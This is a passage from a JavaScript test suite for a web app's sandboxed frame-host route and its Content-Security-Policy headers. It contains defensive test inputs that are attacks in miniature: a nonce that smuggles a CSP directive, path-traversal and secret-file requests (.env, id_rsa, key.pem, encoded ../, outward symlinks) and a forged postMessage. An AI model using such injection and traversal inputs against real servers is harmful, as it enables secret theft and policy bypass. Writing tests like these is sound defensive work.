    const r = spawnSync(process.execPath, [f], { encoding: 'utf8', env: { ...process.env, VIBESPACE_CSP_REPORTS_FILE: '' } });
    return { rc: r.status, out: r.stdout + r.stderr };
  };
  const only = child('test-csp-child-sanitizer.mjs', [LINE]);
  ok(only.rc === 0 && /CSP: 1 line\(s\) of the sanitizer's parse — not a gap in the policy/.test(only.out) && /«window\.__pwned=14»/.test(only.out) && /SANITIZER's parse/.test(only.out), 'a suite whose file holds ONLY a sanitizer-parse line ⇒ exit 0, the line printed with its words', only);
  const both = child('test-csp-child-sanitizer-red.mjs', [LINE, { ...LINE, kind: undefined, line: 9, sample: 'window.__x=1' }]);
  ok(both.rc === 1 && /CSP: the app page reported 1 thing/.test(both.out), '…and one more line WITHOUT the kind ⇒ exit 1, that one counted (the policy is complete only when nothing else was reported)', both);
  ok(cspSanitizerLine(JSON.stringify(LINE)) && !cspSanitizerLine(JSON.stringify({ ...LINE, kind: undefined })) && !cspSanitizerLine('not json'), 'cspSanitizerLine: the kind, read off the line');
}

// ── ⑦ THE FRAME HOST ──
console.log('⑦ the frame host — a frame the page makes gets its OWN policy, never the app page\'s (lane design-frame-host)');
{
  const FH = require(path.join(REPO, 'src/server/frame-host.js'));
  const MF = require(path.join(REPO, 'src/mail-frame.js'));
  const DCM = { FRAME_HOST: (/^export const FRAME_HOST = '([^']+)';$/m.exec(readRepo('src/lib/design-canvas-model.js')) || [])[1] };
  const hostLine = SRV.split('\n').find((l) => l.startsWith("require('./src/server/frame-host.js').register(app);"));
  ok(!!hostLine && SRV.indexOf('app.use(auth.middleware());') < SRV.indexOf(hostLine) && SRV.indexOf(hostLine) < SRV.indexOf("app.use(require('./src/server/static-public.js').create("), 'server.js registers the frame host behind the sign-in gate (a read like any other: the frame\'s navigation carries the cookie, measured)', hostLine);
  const dirs = (v) => new Map(String(v || '').split(';').map((x) => x.trim().split(/\s+/)).filter((a) => a[0]).map(([d, ...x]) => [d, x]));
  /** What a frame-host policy breaks: [] = it holds (always a sandbox, never a widening flag, no reporting). */
  const hostFails = (v) => {
    const d = dirs(v), out = [];
    if (!/^sandbox(\s|;)/.test(String(v || ''))) out.push('no sandbox first (opened top-level, the host would run at the app\'s origin)');
    if ((d.get('sandbox') || []).some((f) => /same-origin|top-navigation|popups|forms|downloads/.test(f))) out.push('a widening sandbox flag');
    if (d.has('report-uri') || d.has('report-to')) out.push('a frame policy reports');
    if (JSON.stringify(d.get('frame-ancestors') || null) !== JSON.stringify(["'self'"])) out.push('frame-ancestors is not \'self\'');
    return out;
  };
  const design = FH.policyFor({ kind: 'design' }), mail = FH.policyFor({ kind: 'mail', n: 'abc123' }), pics = FH.policyFor({ kind: 'mail', n: 'abc123', pictures: '1' });
  ok(design === "sandbox allow-scripts allow-modals; frame-ancestors 'self'" && hostFails(design).length === 0, 'design = a published page\'s rule: the sandbox (scripts; modals for print) and the ancestors — NO fetch or script directive, so the artboard\'s inline scripts, handlers, eval and https:// assets run as when published', design);
  ok(mail === `sandbox allow-scripts; ${MF.cspFor({ nonce: 'abc123', host: FH.HOST_HASH })}; frame-ancestors 'self'` && hostFails(mail).length === 0 && pics.includes('img-src data: https:') && !mail.includes('https:'), 'mail = the mail frame\'s own policy (cspFor: default-src \'none\', THIS address\'s nonce; https: pictures only after the press) + the host\'s script hash + the ancestors', mail);
  const hostile = FH.policyFor({ kind: 'mail', n: "x'; script-src * 'unsafe-inline" }), long = FH.policyFor({ kind: 'mail', n: 'z'.repeat(500) });
  const ss = dirs(hostile).get('script-src') || [];
  ok(ss.length === 2 && /^'nonce-[A-Za-z0-9_-]*'$/.test(ss[0]) && ss[1] === FH.HOST_HASH && !hostile.includes('*') && (long.match(/'nonce-(z+)'/) || [])[1].length === FH.NONCE_MAX, 'a nonce from the address is its own alphabet and bounded — script-src stays ONE nonce + the host\'s hash (a quote, a `*`, a second source never ride in)', ss);
  ok([{}, { kind: 'Design' }, { kind: ['design', 'mail'] }, { kind: 'app' }].every((q) => FH.policyFor(q) === null), 'any other kind (a missing one, a case variant, a repeated parameter) ⇒ no policy (404)');
  const scripts = [...FH.HOST_DOC.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((m) => m[1]);
  const crypto = require('node:crypto');
  ok(scripts.length === 1 && scripts[0] === FH.HOST_JS && FH.HOST_HASH === `'sha256-${crypto.createHash('sha256').update(scripts[0]).digest('base64')}'` && !/[<]/.test(FH.HOST_JS), 'the host document carries ONE inline script, and the mail header\'s hash IS that script\'s (it runs under the mail policy; nothing else inline does)');
  // the route, through server.js's own line and the REAL sign-in gate
  const dir = path.join(ROOT, 'fh-auth'); fs.mkdirSync(dir, { recursive: true });
  const auth = new Auth(dir, {}); auth.setPassword('pw-fh-81');
  const app = express(); app.use(auth.middleware()); auth.registerRoutes(app);
  new Function('app', 'require', hostLine)(app, (m) => require(m.startsWith('./') ? path.join(REPO, m) : m));
  const srv = await new Promise((r) => { const x = app.listen(0, '127.0.0.1', () => r(x)); });
  const port = srv.address().port;
  const cookie = 'vs_token=' + auth.issueToken('test-csp-report');
  const fget = (p, h = {}) => new Promise((resolve) => http.get({ host: '127.0.0.1', port, path: p, headers: { accept: 'text/html', ...h } }, (x) => { let d = ''; x.on('data', (c) => { d += c; }); x.on('end', () => resolve({ status: x.statusCode, headers: x.headers, text: d })); }));
  const rd = await fget('/frame-host?kind=design', { cookie }), rm = await fget('/frame-host?kind=mail&n=abc123&pictures=1', { cookie });
  ok(rd.status === 200 && rd.headers['content-security-policy'] === design && !rd.headers['content-security-policy-report-only'] && rd.text === FH.HOST_DOC && /no-store/.test(rd.headers['cache-control'] || '') && rd.headers['x-content-type-options'] === 'nosniff' && /^text\/html/.test(rd.headers['content-type'] || ''), 'GET /frame-host?kind=design: the host document, the design policy as a REAL header (never the app page\'s report-only one), no-store, nosniff', { status: rd.status, csp: rd.headers['content-security-policy'] });
  ok(rm.status === 200 && rm.headers['content-security-policy'] === pics && rm.text === FH.HOST_DOC, 'GET /frame-host?kind=mail&n=…&pictures=1: the same document, the mail policy with that nonce and https: pictures', rm.headers['content-security-policy']);
  const bad = await Promise.all(['/frame-host', '/frame-host?kind=app', '/frame-host?kind=design&kind=mail'].map((p) => fget(p, { cookie })));
  const anon = await fget('/frame-host?kind=design'), anonApi = await fget('/frame-host?kind=design', { accept: 'application/json' });
  ok(bad.every((r) => r.status === 404 && !r.headers['content-security-policy']), 'no kind, another kind, a repeated kind ⇒ 404, no document', bad.map((r) => r.status));
  ok(anon.status === 302 && /\/login$/.test(anon.headers.location || '') && anonApi.status === 401 && !anon.headers['content-security-policy'], 'no cookie ⇒ the sign-in gate (a page load is sent to /login, a read is 401) — the host is no door', { anon: anon.status, api: anonApi.status });
  await new Promise((c) => srv.close(c));
  // the handshake — the client half (src/lib/frame-host.js) against the host's own script, in a fake DOM that keeps the
  // browser's at-target order (capture listeners first — measured in Chrome by the lane's probe)
  const fakeFrame = () => {
    const ls = [], sent = [];
    return { sent, src: '', contentWindow: { postMessage: (m, o) => sent.push([m, o]) },
      addEventListener(type, fn, cap) { ls.push({ type, fn, cap: cap === true || !!(cap && cap.capture) }); },
      fire(type) { let stop = false; const e = { type, currentTarget: this, stopImmediatePropagation() { stop = true; } }; for (const l of [...ls.filter((x) => x.cap), ...ls.filter((x) => !x.cap)]) { if (l.type !== type) continue; l.fn(e); if (stop) break; } } };
  };
  const writerAt = async (src) => { const f = path.join(ROOT, `frame-host-${Math.random().toString(16).slice(2)}.mjs`); fs.writeFileSync(f, src); return import(f); };
  const CLIENT = readRepo('src/lib/frame-host.js');
  const handshake = (W) => {
    const f = fakeFrame(); let callerLoads = 0;
    f.addEventListener('load', () => { callerLoads++; });   // the canvas's order: its listener first, the writer's later
    W.writeFrame(f, '<p>A</p>', DCM.FRAME_HOST);
    const before = f.sent.length;
    f.fire('load');                                         // the HOST loaded
    const afterHost = { sent: f.sent.slice(), callerLoads };
    f.fire('load');                                         // the WRITTEN document loaded
    const g = fakeFrame(); W.writeFrame(g, '<p>1</p>', DCM.FRAME_HOST); W.writeFrame(g, '<p>2</p>', DCM.FRAME_HOST); g.fire('load');
    return { src: f.src, before, afterHost, callerLoads, sentAfter: f.sent.length, kept: f.__frameDoc, twice: g.sent };
  };
  const W1 = await writerAt(CLIENT);
  const h = handshake(W1);
  ok(h.src === '/frame-host?kind=design' && h.before === 0 && h.afterHost.sent.length === 1 && JSON.stringify(h.afterHost.sent[0]) === JSON.stringify([{ vsFrameDoc: 1, html: '<p>A</p>' }, '*']) && h.afterHost.callerLoads === 0, 'writeFrame: src = the builder\'s address; on the HOST\'s load the document is posted once, and the caller\'s load listener never sees that load', h);
  ok(h.callerLoads === 1 && h.sentAfter === 1 && h.kept === '<p>A</p>' && h.twice.length === 1 && h.twice[0][0].html === '<p>2</p>', '…the WRITTEN document\'s load is the caller\'s (nothing posted again); the element keeps the document (what srcdoc held); two writes before the host loaded post the second only', h);
  const cutStop = CLIENT.replace('  e.stopImmediatePropagation();\n', '');
  const hm = handshake(await writerAt(cutStop));
  ok(cutStop !== CLIENT && hm.afterHost.callerLoads === 1, 'MUTANT (the writer without stopImmediatePropagation) ⇒ RED: the caller takes the host\'s load for its document\'s (the canvas would say its mode to an empty host)', hm.afterHost);
  const vm = require('node:vm');
  const host = (js, { framed = true } = {}) => {
    const ls = [], writes = [], parent = { tag: 'parent' };
    const win = { addEventListener: (t, fn) => { if (t === 'message') ls.push(fn); }, document: { open() { writes.push('open'); }, write(x) { writes.push(x); }, close() { writes.push('close'); } } };
    win.window = win; win.parent = framed ? parent : win;
    vm.runInNewContext(js, win);
    const say = (source, data) => { for (const fn of ls) fn({ source, data }); };
    return { parent, writes, say };
  };
  const H = host(FH.HOST_JS);
  H.say({ tag: 'another-window' }, { vsFrameDoc: 1, html: '<p>evil</p>' });
  H.say(H.parent, { vsFrameDoc: '1', html: '<p>x</p>' }); H.say(H.parent, { vsFrameDoc: 1, html: {} });
  const none = H.writes.length;
  H.say(H.parent, h.afterHost.sent[0][0]); H.say(H.parent, { vsFrameDoc: 1, html: '<p>second</p>' });
  ok(none === 0 && JSON.stringify(H.writes) === JSON.stringify(['open', '<p>A</p>', 'close']), 'the host writes the document its PARENT posted (the writer\'s own message), ONCE — never another window\'s, never a malformed one, never a second', H.writes);
  const U = host(FH.HOST_JS, { framed: false }); U.say(U.parent, { vsFrameDoc: 1, html: '<p>top</p>' });
  ok(U.writes.length === 0, 'opened top-level (its parent is itself) the host writes nothing');
  const noSource = FH.HOST_JS.replace('e.source!==parent||', '');
  const HM = host(noSource); HM.say({ tag: 'another-window' }, { vsFrameDoc: 1, html: '<p>evil</p>' });
  ok(noSource !== FH.HOST_JS && HM.writes.includes('<p>evil</p>'), 'MUTANT (the host without its source check) ⇒ RED: another window\'s document is written', HM.writes);
  const FM = load(path.join(REPO, 'src/server/frame-host.js'), readRepo('src/server/frame-host.js').replace("return `sandbox allow-scripts allow-modals; ${ANCESTORS}`;", 'return ANCESTORS;'));
  ok(hostFails(FM.policyFor({ kind: 'design' })).some((x) => /no sandbox/.test(x)), 'MUTANT (the design kind without its sandbox) ⇒ RED: opened top-level the host would be the app\'s origin', FM.policyFor({ kind: 'design' }));
  // the exception list is empty, and the address lives where it may
  const S = await import(new URL('./scratch.mjs', import.meta.url).href);
  ok(Array.isArray(S.CSP_EXCEPTIONS) && S.CSP_EXCEPTIONS.length === 0, 'scripts/scratch.mjs CSP_EXCEPTIONS is EMPTY — the design and mail frames report nothing, so every chrome suite ends with zero reports unexcused');
  const walk = (d) => fs.readdirSync(path.join(REPO, d), { withFileTypes: true }).flatMap((e) => e.isDirectory() ? walk(path.join(d, e.name)) : /\.js$/.test(e.name) ? [path.join(d, e.name)] : []);
  const code = (t) => t.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
  const homes = ['server.js', ...walk('src')].filter((f) => /['"`]\/frame-host\b/.test(code(readRepo(f)))).sort();
  ok(JSON.stringify(homes) === JSON.stringify(['src/lib/design-canvas-model.js', 'src/lib/frame-host.js', 'src/mail-frame.js', 'src/server/frame-host.js']), 'the address `/frame-host` is written in the builders (design-canvas-model.js FRAME_HOST, mail-frame.js frameHostSrc, src/lib/frame-host.js hostAddress — lane frame-host-preview) and the route — nowhere else', homes);
  const pub = fs.readdirSync(path.join(REPO, 'public')).filter((f) => /frame-host/i.test(f) || (/\.html?$/.test(f) && fs.readFileSync(path.join(REPO, 'public', f), 'utf8').includes('document.write(d.html)')));
  ok(pub.length === 0, 'public/ carries no host document — express.static would serve it with NO header: a same-origin writer', pub.join(', '));
}

// ── ⑧ FOREIGN HTML IN THE FRAME HOST ──
console.log('⑧ foreign HTML in the frame host — the code editor\'s preview, an .eml body, a Word document\'s embedded HTML (lane frame-host-preview)');
{
  const FH = require(path.join(REPO, 'src/server/frame-host.js'));
  const MF = require(path.join(REPO, 'src/mail-frame.js'));
  const dirs = (v) => new Map(String(v || '').split(';').map((x) => x.trim().split(/\s+/)).filter((a) => a[0]).map(([d, ...x]) => [d, x]));
  const hostFails = (v) => {
    const d = dirs(v), out = [];
    if (!/^sandbox(\s|;)/.test(String(v || ''))) out.push('no sandbox first');
    if ((d.get('sandbox') || []).some((f) => /same-origin|top-navigation|popups|forms|downloads/.test(f))) out.push('a widening sandbox flag');
    if (d.has('report-uri') || d.has('report-to')) out.push('a frame policy reports');
    if (JSON.stringify(d.get('frame-ancestors') || null) !== JSON.stringify(["'self'"])) out.push('frame-ancestors is not \'self\'');
    return out;
  };
  const N = 'n'.repeat(24), TOK = 'T'.repeat(24), FOLDER = `http://vs.example/frame-host/f/${TOK}/`;
  const pv = FH.policyFor({ kind: 'preview' }), pvf = FH.previewPolicy(FOLDER);
  const eml = FH.policyFor({ kind: 'eml' }, { nonce: N }), emlP = FH.policyFor({ kind: 'eml', pictures: '1' }, { nonce: N }), docx = FH.policyFor({ kind: 'docx', pictures: '1' }, { nonce: N });
  ok([pv, pvf, eml, emlP, docx].every((v) => hostFails(v).length === 0), 'preview / eml / docx: always a sandbox first, no widening flag (never allow-same-origin), no report-uri, frame-ancestors \'self\'', [pv, eml, docx].map(hostFails));
  const ps = dirs(pvf);
  ok(JSON.stringify(ps.get('sandbox')) === '["allow-scripts"]' && JSON.stringify(ps.get('default-src')) === `["'none'"]` && JSON.stringify(ps.get('script-src')) === JSON.stringify(["'unsafe-inline'", "'unsafe-eval'", FOLDER, 'https:']) && JSON.stringify(ps.get('connect-src')) === JSON.stringify([FOLDER, 'https:']) && ['style-src', 'img-src', 'font-src', 'media-src'].every((d) => (ps.get(d) || []).includes(FOLDER)) && ![...ps].some(([d, x]) => d !== 'frame-ancestors' && x.some((v) => v === "'self'" || v === '*' || v === 'http:' || v === 'https://*')),
    'preview = the page\'s own scripts (inline, eval), styles, data:/blob: pictures, https: libraries — and ITS FOLDER by its full address; never \'self\', never http: (the hub is no source), never *', pvf);
  ok(pv === pvf.split(` ${FOLDER}`).join('') && !pv.includes('/frame-host/f/') && FH.previewPolicy("http://x/frame-host/f/short/; script-src *") === pv && FH.previewPolicy(`http://h'/frame-host/f/${TOK}/`) === pv, 'preview without a folder (a remote file, a refused base) names no folder; a malformed folder address (a short token, a quote, a `;`) is never written into the policy');
  ok(eml === `sandbox allow-scripts; ${MF.cspFor({ nonce: N })}; frame-ancestors 'self'` && !eml.includes('https:') && emlP.includes('img-src data: https:') && docx === `sandbox allow-scripts; ${MF.cspFor({ nonce: N })}; frame-ancestors 'self'`, 'eml / docx = the mail frame\'s own policy (no network, data: pictures) with THIS response\'s nonce as the only script source; https: pictures only for eml with pictures=1 (docx never)', { eml, emlP, docx });
  ok(!eml.includes(FH.HOST_HASH) && [{ kind: 'eml' }, { kind: 'docx' }].every((q) => FH.policyFor(q) === null && FH.policyFor(q, { nonce: 'short' }) === null && FH.policyFor(q, { nonce: "x'; script-src *" }) === null), 'a quiet kind never carries the host\'s HASH (a byte-exact copy of the line in the document would match it) and never runs without its own nonce (none, too short, a quote ⇒ no policy)');
  const qd = FH.hostDocFor(N), qs = [...qd.matchAll(/<script nonce="([^"]+)">([\s\S]*?)<\/script>/g)];
  ok(qs.length === 1 && qs[0][1] === N && qs[0][2] === FH.HOST_JS && (qd.match(/<script/g) || []).length === 1 && FH.hostDocFor('') === FH.HOST_DOC, 'the quiet host document: the same ONE line, carrying the response\'s nonce');
  // the folder's path rule (PURE)
  const pathCases = [['a.css', 'a.css'], ['sub/b.png', 'sub/b.png'], ['x.MJS', 'x.MJS'], ['../x.css', null], ['.env', null], ['sub/.git/config', null], ['a/./b.css', null], ['a//b.css', null], ['key.pem', null], ['id_rsa', null], ['db.sqlite', null], ['', null], ['a\0.css', null]];
  const pathBad = pathCases.filter(([r, want]) => (FH.folderPathVerdict(r).rel || null) !== want);
  ok(pathBad.length === 0, `the folder serves a web file's path only: ${pathCases.length} cases — no .. / . / empty segment, no dot name (.env, .git), no key / database / extension-less file`, pathBad);
  const t0 = 1e12, a = FH.mintFolder('/fhp/a', t0), a2 = FH.mintFolder('/fhp/a', t0 + 1000), b = FH.mintFolder('/fhp/b', t0 + 1000);
  ok(/^[A-Za-z0-9_-]{24}$/.test(a) && a === a2 && a !== b && FH.folderOf(a, t0 + 2000).dir === '/fhp/a' && FH.folderOf(a, t0 + 2000 + FH.FOLDER_IDLE_MS + 1) === null && FH.folderOf('x'.repeat(24), t0) === null && FH.folderOf('short', t0) === null, 'a folder token: 24 random characters; the same live folder keeps its token; idle 30 min ⇒ gone; an unknown or malformed token ⇒ nothing');
  const first = FH.mintFolder('/fhp/cap-0', t0 + 5000);
  for (let i = 1; i <= FH.FOLDER_CAP; i++) FH.mintFolder(`/fhp/cap-${i}`, t0 + 5000 + i);
  ok(FH.folderOf(first, t0 + 6000 + FH.FOLDER_CAP) === null && !!FH.folderOf(FH.mintFolder(`/fhp/cap-${FH.FOLDER_CAP}`, t0 + 7000 + FH.FOLDER_CAP), t0 + 7001 + FH.FOLDER_CAP), `at most ${FH.FOLDER_CAP} folders live — the least recently used goes first`);
  // the client's addresses (src/lib/frame-host.js imports nothing)
  const W = await import(new URL(`data:text/javascript;base64,${Buffer.from(readRepo('src/lib/frame-host.js')).toString('base64')}`));
  let thrown = ''; try { W.hostAddress('app'); } catch (e) { thrown = e.message; }
  ok(W.hostAddress('preview', { base: '/a b/c&d' }) === '/frame-host?kind=preview&base=%2Fa%20b%2Fc%26d' && W.hostAddress('preview') === '/frame-host?kind=preview' && W.hostAddress('eml') === '/frame-host?kind=eml' && W.hostAddress('eml', { pictures: true }) === '/frame-host?kind=eml&pictures=1' && W.hostAddress('docx', { pictures: true }) === '/frame-host?kind=docx' && /no such frame kind/.test(thrown), 'hostAddress: preview + its folder (encoded), eml (+ pictures), docx (never pictures); any other kind throws');
  // the route — server.js's own line, the REAL sign-in gate (the folder is a door: src/auth.js)
  const hostLine = SRV.split('\n').find((l) => l.startsWith("require('./src/server/frame-host.js').register(app);"));
  const FX = path.join(ROOT, 'fh-folder'), OUTSIDE = path.join(ROOT, 'fh-outside');
  fs.mkdirSync(path.join(FX, 'sub'), { recursive: true }); fs.mkdirSync(OUTSIDE, { recursive: true });
  fs.writeFileSync(path.join(FX, 'page.html'), '<p>page</p>'); fs.writeFileSync(path.join(FX, 'a.css'), 'p{color:red}'); fs.writeFileSync(path.join(FX, 'sub', 'd.json'), '{"d":1}');
  fs.writeFileSync(path.join(FX, '.env'), 'FHP_ENV_SECRET'); fs.writeFileSync(path.join(FX, 'key.pem'), 'FHP_PEM_SECRET'); fs.writeFileSync(path.join(OUTSIDE, 'o.css'), 'FHP_OUTSIDE_SECRET');
  fs.symlinkSync(path.join(OUTSIDE, 'o.css'), path.join(FX, 'link-out.css')); fs.symlinkSync(OUTSIDE, path.join(FX, 'dir-out'));
  const adir = path.join(ROOT, 'fh8-auth'); fs.mkdirSync(adir, { recursive: true });
  const auth = new Auth(adir, {}); auth.setPassword('pw-fh8-81');
  const app = express(); app.use(auth.middleware()); auth.registerRoutes(app);
  new Function('app', 'require', hostLine)(app, (m) => require(m.startsWith('./') ? path.join(REPO, m) : m));
  const srv = await new Promise((r) => { const x = app.listen(0, '127.0.0.1', () => r(x)); });
  const port = srv.address().port;
  const cookie = 'vs_token=' + auth.issueToken('test-csp-report-8');
  const req = (p, { method = 'GET', headers = {} } = {}) => new Promise((resolve) => { const r = http.request({ host: '127.0.0.1', port, path: p, method, headers: { accept: 'text/html', ...headers } }, (x) => { let d = ''; x.on('data', (c) => { d += c; }); x.on('end', () => resolve({ status: x.statusCode, headers: x.headers, text: d })); }); r.end(); });
  const csp = (r) => r.headers['content-security-policy'] || '';
  const e1 = await req('/frame-host?kind=eml', { headers: { cookie } }), e2 = await req('/frame-host?kind=eml&pictures=1', { headers: { cookie } }), d1 = await req('/frame-host?kind=docx', { headers: { cookie } });
  const nonceOf = (r) => (/'nonce-([A-Za-z0-9_-]+)'/.exec(csp(r)) || [])[1];
  ok([e1, e2, d1].every((r) => r.status === 200 && nonceOf(r) && r.text === FH.hostDocFor(nonceOf(r)) && csp(r) === FH.policyFor({ kind: r === d1 ? 'docx' : 'eml', pictures: r === e2 ? '1' : undefined }, { nonce: nonceOf(r) }) && /no-store/.test(r.headers['cache-control'] || '')) && new Set([e1, e2, d1].map(nonceOf)).size === 3,
    'GET /frame-host?kind=eml|docx: the host document whose ONE script carries a nonce made for THAT response (three answers, three nonces), the same nonce the only script source of its header; no-store', [e1, e2, d1].map(csp));
  const p0 = await req('/frame-host?kind=preview', { headers: { cookie } });
  ok(p0.status === 200 && csp(p0) === FH.policyFor({ kind: 'preview' }) && p0.text === FH.HOST_DOC, 'GET /frame-host?kind=preview (no base — a remote file): the host with the preview policy, no folder', csp(p0));
  const nav = await req(`/frame-host?kind=preview&base=${encodeURIComponent(FX)}`, { headers: { cookie } });
  const tok = (/^\/frame-host\/f\/([A-Za-z0-9_-]{24})\/$/.exec(nav.headers.location || '') || [])[1];
  const nav2 = await req(`/frame-host?kind=preview&base=${encodeURIComponent(FX + '/')}`, { headers: { cookie } });
  ok(nav.status === 302 && !!tok && nav2.headers.location === nav.headers.location && /no-store/.test(nav.headers['cache-control'] || ''), 'GET /frame-host?kind=preview&base=<a local folder> (signed in) ⇒ 302 to /frame-host/f/<token>/ — the folder\'s own address; the same folder keeps its token', { status: nav.status, location: nav.headers.location });
  const refusedBases = await Promise.all(['sub', path.join(FX, 'nope'), path.join(FX, 'a.css'), '/dev/null\0x'].map((b) => req(`/frame-host?kind=preview&base=${encodeURIComponent(b)}`, { headers: { cookie } })));
  ok(refusedBases.every((r) => r.status === 200 && !r.headers.location && csp(r) === FH.policyFor({ kind: 'preview' })), 'a base that is not an absolute local folder (relative, missing, a file, a NUL) ⇒ no token: the host with no folder', refusedBases.map((r) => r.status));
  const anonNav = await req(`/frame-host?kind=preview&base=${encodeURIComponent(path.join(FX, 'sub'))}`);
  ok(anonNav.status === 302 && /\/login$/.test(anonNav.headers.location || ''), 'no cookie ⇒ the sign-in gate on the base navigation (a token is minted for a signed-in navigation only)', anonNav.headers.location);
  const F = `/frame-host/f/${tok}/`, own = `http://127.0.0.1:${port}${F}`;
  const hostDoc = await req(F), css = await req(F + 'a.css'), json = await req(F + 'sub/d.json'), page = await req(F + 'page.html');
  ok(hostDoc.status === 200 && hostDoc.text === FH.HOST_DOC && csp(hostDoc) === FH.previewPolicy(own), 'GET /frame-host/f/<token>/ WITHOUT a cookie (the opaque frame sends none — measured): the host document, the preview policy naming THIS folder by its full address', csp(hostDoc));
  ok(css.status === 200 && css.text === 'p{color:red}' && json.status === 200 && json.text === '{"d":1}' && [css, json, page].every((r) => r.headers['access-control-allow-origin'] === '*' && csp(r) === FH.previewPolicy(own) && r.headers['x-content-type-options'] === 'nosniff') && page.status === 200,
    'the folder\'s files answer (a stylesheet, a json under sub/, a sibling page) — CORS-open for the opaque frame, each under the preview policy (a sibling page the preview navigates to is sandboxed the same way)', { css: css.status, json: json.status, page: page.status });
  const refused = await Promise.all(['.env', 'key.pem', 'link-out.css', 'dir-out/o.css', '..%2Ffh-outside%2Fo.css', 'sub%2F..%2F..%2Ffh-outside%2Fo.css', 'nope.css', 'sub'].map((p) => req(F + p)));
  ok(refused.every((r) => r.status === 404 && !/SECRET/.test(r.text) && r.headers['access-control-allow-origin'] === '*'), 'never answered: .env (a dot name), key.pem (not a web file), a symlink OUT of the folder (file and folder), an encoded ../ out, a missing file, a folder — 404, never the bytes', refused.map((r) => r.status));
  const otherTok = await req(`/frame-host/f/${'Z'.repeat(24)}/a.css`), badTok = await req('/frame-host/f/short/a.css'), anonApi = await req('/frame-host/f/short/a.css', { headers: { accept: 'application/json' } }), post = await req(F + 'a.css', { method: 'POST', headers: { cookie: '' } });
  ok(otherTok.status === 404 && badTok.status === 302 && anonApi.status === 401 && [401, 403].includes(post.status), 'an unknown token ⇒ 404; a malformed one is no door (the gate: /login, 401); a POST to the folder ⇒ the gate — the door is GET only', { other: otherTok.status, bad: badTok.status, api: anonApi.status, post: post.status });
  await new Promise((c) => srv.close(c));
  ok(/if \(req\.method === 'GET' && \/\^\\\/frame-host\\\/f\\\/\[A-Za-z0-9_-\]\{24\}\\\/\/\.test\(p\)\) return next\(\);/.test(readRepo('src/auth.js')), 'src/auth.js: the folder door is GET + /frame-host/f/<24 token characters>/ exactly (no prefix, no other method)');
  // THE CENSUS — every frame src/lib makes for foreign HTML: no `allow-same-origin`, no srcdoc — a site only with a reason row
  const libFiles = fs.readdirSync(path.join(REPO, 'src/lib')).filter((f) => f.endsWith('.js')).map((f) => `src/lib/${f}`);
  const code = (t) => t.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '').replace(/\s\/\/ .*$/gm, '');
  const SAME_ORIGIN_OK = [
    ['src/lib/doc-window-ui.js', 'the doc window\'s PRINT frame: NO allow-scripts (nothing in it runs) — same-origin only so this window waits for the owner\'s own document\'s fonts and pictures and calls its print()'],
  ];
  const SRCDOC_OK = [
    ['src/lib/design-canvas.js', 1, 'the canvas core\'s fallback writer — the PUBLISHED page\'s viewer (its own policy, the page /p/<id>); the app\'s Design window hands writeFrame'],
    ['src/lib/design-canvas-model.js', 1, 'Print all\'s inner artboard frames — written INSIDE the host\'s design document, so they inherit the HOST\'s design policy, never the app page\'s'],
    ['src/lib/doc-window-ui.js', 1, 'the doc window\'s print frame — no scripts; the owner\'s own document'],
  ];
  const srcdocSites = (t) => { const c = code(t); return [...c.matchAll(/([A-Za-z_$][\w$]*)\.srcdoc\s*=(?!=)/g)].filter((m) => m[1] !== 'rec').length + (c.match(/setAttribute\(\s*['"]srcdoc['"]/g) || []).length + (c.match(/\ssrcdoc="\$\{/g) || []).length; };
  const census = (texts) => {
    const red = [];
    for (const [f, t] of texts) {
      const so = code(t).includes('allow-same-origin'), soRow = SAME_ORIGIN_OK.find((r) => r[0] === f);
      if (so && !soRow) red.push(`${f}: allow-same-origin with no reason row`);
      if (!so && soRow) red.push(`${f}: a dead allow-same-origin row`);
      const n = srcdocSites(t), sdRow = SRCDOC_OK.find((r) => r[0] === f);
      if (n !== (sdRow ? sdRow[1] : 0)) red.push(`${f}: ${n} srcdoc site(s), ${sdRow ? sdRow[1] : 0} allowed`);
    }
    return red;
  };
  const TEXTS = new Map(libFiles.map((f) => [f, readRepo(f)]));
  const red8 = census(TEXTS);
  ok(red8.length === 0, `the census over ${libFiles.length} src/lib files: allow-same-origin only where a reason row names it (${SAME_ORIGIN_OK.length}: ${SAME_ORIGIN_OK.map((r) => r[0].replace('src/lib/', '')).join(', ')}); srcdoc only where one does (${SRCDOC_OK.map((r) => r[0].replace('src/lib/', '') + ' ' + r[1]).join(', ')})`, red8);
  const FRAMES = [['src/lib/code-editor.js', "writeFrame(this._previewIframe, src, hostAddress('preview', { base: dir }));", "setAttribute('sandbox', 'allow-scripts')"], ['src/lib/file-viewer.js', "writeFrame(frame, mail.htmlBody, hostAddress('eml', { pictures }));", "setAttribute('sandbox', 'allow-scripts')"], ['src/lib/docx-viewer.js', "writeFrame(f, ALTCHUNK_CSP + html, hostAddress('docx'));", "setAttribute('sandbox', 'allow-scripts')"]];
  ok(FRAMES.every(([f, w, s]) => TEXTS.get(f).includes(w) && TEXTS.get(f).includes(s) && (TEXTS.get(f).match(/writeFrame\(/g) || []).length === 1 && /import \{ writeFrame, hostAddress \} from '\.\/frame-host\.js';/.test(TEXTS.get(f))), 'the three frames: each one writeFrame through the host\'s address for its kind (preview + its folder, eml + pictures, docx), sandbox="allow-scripts" — the ONE writer (src/lib/frame-host.js), never a second', FRAMES.map(([f]) => f));
  const mutate = (f, from, to) => { const t = TEXTS.get(f); const m = t.replace(from, to); return m === t ? null : census(new Map([...TEXTS, [f, m]])); };
  const M1 = mutate('src/lib/code-editor.js', "this._previewIframe.setAttribute('sandbox', 'allow-scripts');", "this._previewIframe.setAttribute('sandbox', 'allow-scripts allow-same-origin');");
  ok(M1 && M1.some((x) => /code-editor\.js: allow-same-origin/.test(x)), 'MUTANT (allow-same-origin back on the preview) ⇒ RED', M1);
  const M2 = [
    mutate('src/lib/code-editor.js', "writeFrame(this._previewIframe, src, hostAddress('preview', { base: dir }));", 'this._previewIframe.srcdoc = src;'),
    mutate('src/lib/file-viewer.js', "writeFrame(frame, mail.htmlBody, hostAddress('eml', { pictures }));", 'frame.srcdoc = mail.htmlBody;'),
    mutate('src/lib/docx-viewer.js', "writeFrame(f, ALTCHUNK_CSP + html, hostAddress('docx'));", 'f.srcdoc = ALTCHUNK_CSP + html;'),
  ];
